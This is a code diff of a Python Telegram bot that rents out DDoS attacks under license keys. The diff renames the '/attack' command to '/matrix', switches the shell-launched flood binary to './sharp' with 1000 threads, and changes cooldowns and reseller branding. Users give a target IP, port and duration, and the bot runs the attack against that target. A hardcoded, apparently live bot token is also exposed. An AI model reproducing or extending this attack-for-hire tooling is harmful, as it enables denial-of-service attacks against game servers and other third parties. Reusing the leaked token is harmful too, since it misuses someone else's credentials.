@@ -26,8 +26,8 @@ db = client['rishi']
 users_collection = db['VIP']
 redeem_codes_collection = db['redeem_codes0']
 
-TELEGRAM_BOT_TOKEN = '7565997354:AAGG8lnJ90dabXuhvrt8LdSLdxOXyJ6pBjM'
-ADMIN_USER_ID = 7519482969 , 7892337554
+TELEGRAM_BOT_TOKEN = '7822223477:AAEVzwNsZRYXwBiP6Q1o34ONx5tddMKwk3U'
+ADMIN_USER_ID = 7519482969 
 
 cooldown_dict = {}
 user_attack_history = {}
@@ -39,7 +39,7 @@ async def help_command(update: Update, context: CallbackContext):
         help_text = (
             "*Here are the commands you can use:* \n\n"
             "*🔸 /start* - Start interacting with the bot.\n"
-            "*🔸 /attack* - Trigger an attack operation.\n"
+            "*🔸 /matrix* - Trigger an attack operation.\n"
             "*🔸 /redeem* - Redeem a code.\n"
             "*🔸 /get_id* - ID LENA HAI LOUDE ?.\n"
         )
@@ -48,7 +48,7 @@ async def help_command(update: Update, context: CallbackContext):
             "*💡 Available Commands for Admins:*\n\n"
             "*🔸 /start* - Start the bot.\n"
             "🔸 /status - Check your subscription status\n"
-            "*🔸 /attack* - Start the attack.\n"
+            "*🔸 /matrix* - Start the attack.\n"
             "*🔸 /get_id* - Get user id.\n"
             "*🔸 /add [user_id]* - Add a user.\n"
             "*🔸 /remove [user_id]* - Remove a user.\n"
@@ -65,10 +65,10 @@ async def start(update: Update, context: CallbackContext):
     user_id = update.effective_user.id  
     user_name = update.effective_user.first_name  
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗕𝗘𝗔𝗦𝗧 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 ☠️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲:- {}\n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗:- \n\n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: inactive ❌\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱s\n• /attack - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @BEAST_KINGDDOS*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*🏴‍☠️ Welcome to the Ultimate Attack Bot! ⚡\n💥 Use /matrix `<IP>:<port>:<duration>` to start an attack ☠️\n/redeem - active license*", parse_mode='Markdown')
         return
     message = (
-        f"*'⚡️𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗕𝗘𝗔𝗦𝗧 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 ☠️\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲:- \n🆔 𝗬𝗼𝘂𝗿 𝗜𝗗:- \n💎 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗦𝘁𝗮𝘁𝘂𝘀: inactive ❌\n\n🎮 𝗕𝗮𝘀𝗶𝗰 𝗖𝗼𝗺𝗺𝗮𝗻𝗱s\n:• /attack - 𝗟𝗮𝘂𝗻𝗰𝗵 𝗔𝘁𝘁𝗮𝗰𝗸\n• /redeem - 𝗔𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗟𝗶𝗰𝗲𝗻𝘀𝗲\n\n💡 𝗡𝗲𝗲𝗱 𝗮 𝗸𝗲𝘆?\n𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘂𝗿 𝗔𝗱𝗺𝗶𝗻𝘀 𝗢𝗿 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀\n\n📢 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @BEAST_KINGDDOS\n━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        f"*'🏴‍☠️ Welcome to the Ultimate Attack Bot! ⚡\n💥 Use /matrix `<IP>:<port>:<duration>` to start an attack ☠️\n/redeem - active license"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -102,7 +102,7 @@ async def add_user(update: Update, context: CallbackContext):
 async def remove_user(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id != ADMIN_USER_ID:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!\n\n• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:@BEAST_KINGDDOS*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!\n\n• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:@matrix_vipddos*", parse_mode='Markdown')
         return
     if len(context.args) != 1:
         await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
@@ -126,17 +126,17 @@ async def attack(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     user_id = update.effective_user.id
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!\n\n• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:@BEAST_KINGDDOS*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀!\n\n• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗱\n• 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱\n\n🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:\n• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿\n\n📢 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:@matrix_vipddos*", parse_mode='Markdown')
         return
     args = context.args
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*📝 𝗨𝘀𝗮𝗴𝗲: /attack <target> <port> <time>\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /attack 1.1.1.1 80 120\n\n⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:\n• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*📢 𝗔𝗥𝗘 𝗬𝗢𝗨 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗕𝗚𝗠𝗜 𝗖𝗛𝗢𝗗𝗡𝗔 ☠️\n\n\n😎 𝗠𝗔𝗧𝗥𝗜𝗫 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧 ⚡\n\n\n📝 𝗨𝘀𝗮𝗴𝗲: /matrix <target> <port> <duration>\n𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /matrix 1.1.1.1 80 120\n\n\n⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:\n• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 180 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 3 𝗺𝗶𝗻𝘂𝘁𝗲𝘀*", parse_mode='Markdown')
         return
     ip, port, duration = args
     if not ip.startswith(valid_ip_prefixes):
         await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
         return
-    cooldown_period = 60
+    cooldown_period = 180
     current_time = datetime.now()
     if user_id in cooldown_dict:
         time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
@@ -174,7 +174,7 @@ async def papa_bol(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./soul {ip} {port} {duration} 100",
+            f"./sharp {ip} {port} {duration} 1000",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -186,7 +186,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
     finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅\n𝗘𝗻𝗱𝗲𝗱 :- {current_time}\n📈 𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝘁𝘂𝘀 :- Attack Completely sussfully*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 ✅*", parse_mode='Markdown')
 
 async def generate_redeem_code(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
@@ -413,7 +413,7 @@ async def is_user_allowed(user_id):
     
 def get_status(active_inactive,):
     # Get the current time
-    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")
+    current_time = datetime.now().strftime("%H:%M:%S IST")
 
     # Create the status message with dynamic subscription status
     server_status = "🟢 SERVERS AVAILABLE"  # Automatically set server status to AVAILABLE
@@ -444,7 +444,7 @@ def main():
     application.add_handler(CommandHandler("status", get_status))
     application.add_handler(CommandHandler("add", add_user))
     application.add_handler(CommandHandler("remove", remove_user))
-    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("matrix", attack))
     application.add_handler(CommandHandler("gen", generate_redeem_code))
     application.add_handler(CommandHandler("redeem", redeem_code))
     application.add_handler(CommandHandler("get_id", papa_bol))
